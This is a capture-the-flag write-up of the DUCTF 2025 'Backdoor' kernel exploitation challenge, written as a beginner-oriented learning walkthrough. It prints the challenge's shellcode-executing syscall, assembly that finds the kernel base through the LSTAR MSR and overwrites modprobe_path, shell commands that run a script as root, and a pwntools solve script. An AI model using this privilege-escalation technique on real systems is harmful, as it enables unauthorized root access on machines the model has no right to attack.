---
title: Writeup - Backdoor (DUCTF 2025)
date: 2025-07-22 00:00:01
tags: 
- writeup
- pwn
- ductf2025
---

# DUCTF 2025 - Backdoor
## Description
```markdown
Can you escape the void in my backdoor? Creds are `ctf:ctf`

`nc chal.2025-us.ductf.net 30005`

[backdoor.tar.gz]
```

## Writeup
This was my first time trying a kernel pwn problem in a CTF, so I will be documenting my entire solve thought process. While [many](https://lkmidas.github.io/posts/20210123-linux-kernel-pwn-part-1/) [intro](https://ir0nstone.gitbook.io/notes/binexp/kernel/introduction) to kernel pwn writeups/tutorials/blogs [already](https://blog.elmo.sg/posts/imaginary-ctf-2023-kernel-pwn/) [exist](https://blog.wohin.me/posts/linux-kernel-pwn-01/) (and are likely better than mine), I'm writing this to retain the information myself and just add to the pile. My writeup will be intended for those who have done userspace pwn quite a bit, but never gotten into kernel pwn before.

I also have to note that I didn't solve this challenge during the actual CTF, but was able to upsolve it afterwards using some help from other writeups:
* [VulnX Writeup](https://vulnx.github.io/blog/posts/DUCTF2025/#backdoor)
* [Naup Writeup](https://naup.mygo.tw/2025/07/20/2025-downunderCTF-writeup/)
* [Official Writeup](https://github.com/DownUnderCTF/Challenges_2025_Public/blob/main/pwn/backdoor/solve/)

### Intro to Kernel Pwn
Kernel pwn is about exploiting the same vulnerabilities present in userland (buffer overflows, UAFs, etc.) but in kernelland. The layout, protections, and interactions are all different in the kernel, but they all deal with privilged code running in the context of the kernel. Interacting with kernel code usually happens through:

* Interactions with a kernel module ([ref1](https://blog.elmo.sg/posts/imaginary-ctf-2023-kernel-pwn/#init_module), [ref2](https://lkmidas.github.io/posts/20210123-linux-kernel-pwn-part-1/#analyzing-the-kernel-module), [ref3](https://ir0nstone.gitbook.io/notes/binexp/kernel/a-basic-kernel-interaction-challenge))
* System calls (our challenge)
* Page faults
* Signals
* etc.

In our case, the kernel source code was patched to add a new system call. System calls ([ref](https://x64.syscall.sh/)), or syscalls, are part of an API that allows unprivileged user applications to make requests to the kernel. If the application wants to interact with hardware in a way that requires privileged access, system calls with specific register arguments are made when the `syscall` instruction is ran, and the kernel picks up code execution from that point.

When doing kernel pwn, [files are typically provided](https://lkmidas.github.io/posts/20210123-linux-kernel-pwn-part-1/#setting-up-the-environment) that are different from userland exploitation:
* `bzImage` or `vmlinuz` - the linux kernel (`vmlinux`, note the "x") is a large file, so typically a compressed version is given to participants
    * If only the `bzImage`/`vmlinuz` is provided, you would [extract](https://raw.githubusercontent.com/torvalds/linux/master/scripts/extract-vmlinux) the `vmlinux` file for reference in your exploit
* `rootfs.cpio.gz` or `initramfs.cpio.gz` - the linux kernel needs a filesystem to attach with basic utilities, commands, and libraries. These are combined together into a compressed CPIO archive
* `run.sh` - oftentimes a bash script is included with the proper `qemu-system` command ([ref](https://lkmidas.github.io/posts/20210123-linux-kernel-pwn-part-1/#the-qemu-run-script)) to emulate the OS properly and specify the kernel mitigations the author wants active

Userland exploits typically use something like pwntools to remotely send data over the network and interact with a vulnerable executable. Kernel pwn is different as the attacker has unprivileged access to a device, and can therefore run arbitrary instructions. This means the exploit is typically a compiled ELF written in C or assembly that's transferred to the system and ran.

When emulating with QEMU, the easiest way to get your exploit ELF onto the box is to unpack the CPIO archive into a directory, add your exploit, and recompile the CPIO archive. I typically use the files provided in the [Wohin writeup](https://blog.wohin.me/posts/linux-kernel-pwn-01/#prepare-your-workstation) as my starting point: [`decompress_cpio.sh`](https://gist.github.com/brant-ruan/784808bc192fff533d8be22932c4e2b6) and [`compile_exp_and_compress_cpio.sh`](https://gist.github.com/brant-ruan/b67dc2fbae150e7bc76fda914816f534).

Additionally, it's nice to have root access into the QEMU-emulated OS to debug exploits. This is often done by adding commands like `setuidgid 0 /bin/sh` in a setup script or modifying the root password hash in `/etc/shadow`.

Although more useful for creating kernel exploitation problems, [here's a quick guide](https://ir0nstone.gitbook.io/notes/binexp/kernel/compiling-customising-and-booting-the-kernel) by ir0nstone about compiling the kernel and kernel modules.

Lastly, I used pwndbg as my GDB plugin since it has [many, nice kernel-based features](https://pwndbg.re/pwndbg/latest/commands/kernel/binder/) that aren't present in plugins like GEF. To debug the kernel, add the `-s` option to the `qemu-system` command (which spins up gdbserver on `localhost:1234`), then run `pwndbg ./vmlinux` in another terminal and inside put `target remote :1234` to connect to the kernel.

### Intro to the Problem
Inside the attached [`backdoor.tar.gz`](/static/ductf-backdoor/backdoor.tar.gz) archive was the `bzImage` compressed kernel, `vmlinux` uncompressed kernel, `run.sh` script with the `qemu-system` command, and a `kernel.diff` file that showed how the kernel source code was modified. The kernel diff showed that a new syscall called "backdoor" (`1337`) was added:
```c
#include <linux/kernel.h>
#include <linux/highmem.h>
#include <linux/set_memory.h>
#include <linux/gfp.h>
#include <linux/syscalls.h>
#include <linux/uaccess.h>
#include <linux/mm.h>

static void (*backdoor_func)(void);

SYSCALL_DEFINE2(backdoor, void __user *, user_shellcode, size_t, size) {
    void* sc = NULL;
    void* page = NULL;
    if (size > PAGE_SIZE) return -EINVAL;

     page = alloc_pages(GFP_KERNEL, 0);  // order 0 = 1 page
    if (!page)
        return -ENOMEM;

    sc = page_address(page);
    if (!sc)
        return -EFAULT;

    // Set the page to RWX (unsafe, but for CTF)
    if (set_memory_rw((unsigned long)sc, 1))
        return -EFAULT;
    if (set_memory_x((unsigned long)sc, 1))
        return -EFAULT;

    if (copy_from_user(sc, user_shellcode, size)) {
        return -EFAULT;
    }

    mb();

    backdoor_func = sc;

    asm volatile(
        "xor %%rax, %%rax\n\t"
        "xor %%rbx, %%rbx\n\t"
        "xor %%rcx, %%rcx\n\t"
        "xor %%rdx, %%rdx\n\t"
        "xor %%rsi, %%rsi\n\t"
        "xor %%rdi, %%rdi\n\t"
        "xor %%rbp, %%rbp\n\t"
        "xor %%r8,  %%r8\n\t"
        "xor %%r9,  %%r9\n\t"
        "xor %%r10, %%r10\n\t"
        "xor %%r11, %%r11\n\t"
        "xor %%r12, %%r12\n\t"
        "xor %%r13, %%r13\n\t"
        "xor %%r14, %%r14\n\t"
        "xor %%r15, %%r15\n\t"
        "xor %%rsp, %%rsp\n\t"

        "fninit\n\t"
        "pxor %%xmm0, %%xmm0\n\t"
        "pxor %%xmm1, %%xmm1\n\t"
        "pxor %%xmm2, %%xmm2\n\t"
        "pxor %%xmm3, %%xmm3\n\t"
        "pxor %%xmm4, %%xmm4\n\t"
        "pxor %%xmm5, %%xmm5\n\t"
        "pxor %%xmm6, %%xmm6\n\t"
        "pxor %%xmm7, %%xmm7\n\t"
        "pxor %%xmm8, %%xmm8\n\t"
        "pxor %%xmm9, %%xmm9\n\t"
        "pxor %%xmm10, %%xmm10\n\t"
        "pxor %%xmm11, %%xmm11\n\t"
        "pxor %%xmm12, %%xmm12\n\t"
        "pxor %%xmm13, %%xmm13\n\t"
        "pxor %%xmm14, %%xmm14\n\t"
        "pxor %%xmm15, %%xmm15\n\t"

        "jmp *%c[func]\n\t"
        :
        : [func] "i" (&backdoor_func)
        : "memory"
        );
    return 0;
}
```

This syscall creates a new kernel page with RWX permissions and copies user-provided shellcode into it. It then clears all the registers including `xmm` registers and jumps to the page. This gives us arbitrary shellcode execution of up to 0x1000 bytes in the kernel but without any pre-initialized register values.

Additionally, the `run.sh` script included the lines `-cpu qemu64,+smep,+smap` and `-append "console=ttyS0 quiet kaslr kpti=1 pti=on panic=0 oops=panic"`, meaning that SMAP, SMEP, kASLR, and KPTI were all enabled ([ref1](https://lkmidas.github.io/posts/20210123-linux-kernel-pwn-part-1/#linux-kernel-mitigation-features), [ref2](https://ir0nstone.gitbook.io/notes/binexp/kernel)). Lastly, running `uname -a` inside revealed it was running kernel version `6.16.0-rc2`, which is the latest version.

There are a number of ways to escalate privileges (which we will cover later), but they all rely on running functions or modifying structs located in kernel memory. Since kASLR was enabled and all registers were cleared, we did not have any addresses to use as a base to access those functions (or so I thought).

I decided to write my exploit in assembly this time as interacting with the syscall and writing the shellcode was all assembly, meaning there really wasn't any C to write. I used my [`add_exp.sh`](/static/ductf-backdoor/add_exp.sh) script which would automatically compile and move my exploit into the rootfs and recompress the FS:
```bash
#!/bin/bash

nasm -f elf64 exp.S -o exp.o
ld -s exp.o -o exp
rm exp.o
mv exp rootfs/exp

pushd . && pushd rootfs
sudo find . | sudo cpio -o -H newc --owner=root:root | gzip -c > ../rootfs.cpio.gz
popd
```

### Solve Path
Alright, so we have arbitrary shellcode execution in the kernel, but no kernel addresses. This either meant we had to figure out some way to spawn a shell/ORW the flag without kernel functions, or we had to figure out how to bypass kASLR. 

My first thought was to see what other hardware registers existed and find one with a kernel address. I quickly came upon `$gs_base`, which is a CPU-specific register with an address that points to per-CPU data. While this had an address in kernelspace, it did not directly point to anything and the offsets to kernelspace were **not constant**. Despite what ChatGPT and other resources online were telling me, `$gs_base` was not directly tied to anything. I also searched through the kernel image and found every reference to `gs:` included another register inside. As an example, it never had `gs:0x10`, it only had `gs:[rip + 0x10]` or something similar. Therefore, without those registers, I couldn't reach an actual reliable kernel address.

What I didn't know until later was that not only could I use the `$rip` register, there's another MSR called `LSTAR` (`IA32_LSTAR`) that also contains a kernel address. The address that `LSTAR` contains is the `entry_SYSCALL_64` symbol, which is 0x80 bytes ahead of the kernel `.text` section base address.

<img src="/static/ductf-backdoor/ss1.png" width="600px">

`/proc/kallsyms` is only reachable by the root user but contains all kernel symbols and their addresses.

Now that we have the kernel base address, there's a number of avenues we can take to get what we want. The most common avenue is `commit_creds(kernel_prepare_cred())` ([ref](https://vulnx.github.io/blog/posts/DUCTF2025/#backdoor)) or overwriting a cred struct ([ref](https://github.com/DownUnderCTF/Challenges_2025_Public/blob/main/pwn/backdoor/solve/exploit.S)), but the easiest way I read was **modifying the `modprobe_path` global variable** ([ref](https://naup.mygo.tw/2025/07/20/2025-downunderCTF-writeup/)). Since a [longer and better explanation is already out there](https://blog.elmo.sg/posts/imaginary-ctf-2023-kernel-pwn/#getting-our-hands-dirty-krop-to-root), just know that whenever a file of unknown type is executed, a series of calls is made, one of which is `call_modprobe()`. This function ends up calling `call_usermodehelper_exec()` which runs `modprobe_path` as root. Therefore, by modifying that path in kernel memory, we can specify an attacker-controlled file to be ran as root.

<img src="/static/ductf-backdoor/ss2.png" width="600px">

Therefore, in our exploit we can write shellcode that calculates the offset to `modprobe_path` from the base address and writes an attacker-controlled path such as `/tmp/x`, then returns to userspace ([`exp.S`](/static/ductf-backdoor/exp.S), [`exp`](/static/ductf-backdoor/exp))
```c
; put IA32_LSTAR MSR address into rax
mov ecx, 0xC0000082
rdmsr
shl rdx, 32
or rax, rdx

; calculate base address
sub rax, 0x80

; calculate modprobe_path address
add rax, 0x1b48960

; write "/tmp/x" to modprobe_path
mov r9, 0x782f706d742f
mov [rax], r9

; return to userspace at $rcx
mov rcx, 0x401000
swapgs
sysretq
```

To get the flag, you'd run the following commands:
```bash
/tmp/exp
echo '#!/bin/sh' > /tmp/x
echo 'chmod 777 /flag.txt' >> /tmp/x
chmod +x /tmp/x
/tmp/exp 0 # trigger modprobe by opening a raw socket
cat /flag.txt
```

Final [solve script](/static/ductf-backdoor/solve.py):
```python
from pwn import *
from base64 import b64encode


# login
p = remote('chal.2025.ductf.net', 30005)
p.recvuntil(b'buildroot login:')
print(f'[+] Logging in...')
p.sendline(b'ctf')
p.recvuntil(b'Password:')
p.sendline(b'ctf')
sleep(3)


# upload file using base64
exploit = b64encode(open('exp','rb').read())
exp_chunks = [exploit[i:i+100] for i in range(0, len(exploit), 100)]

print(f'[+] Uploading {len(exp_chunks)} chunks')
for chunk in exp_chunks:
    print('.',end='', flush=True)
    p.sendline(b'echo ' + chunk + b' >> /tmp/b64')
    sleep(0.5)

p.sendline(b'cat /tmp/b64 | base64 -d > /tmp/exp')
p.sendline(b'chmod +x /tmp/exp')


# run the exploit
p.sendline(b'/tmp/exp')
p.sendline(b"echo '#!/bin/sh' > /tmp/x")
p.sendline(b"echo 'chmod 777 /flag.txt' >> /tmp/x")
p.sendline(b'chmod +x /tmp/x')
p.sendline(b'/tmp/exp 0')
p.sendline(b'cat /flag.txt')
p.interactive()
```

<img src="/static/ductf-backdoor/ss3.png" width="500px">

**Flag**: `DUCTF{n0_r3g1st3rs_n0_pr0bl3m!}`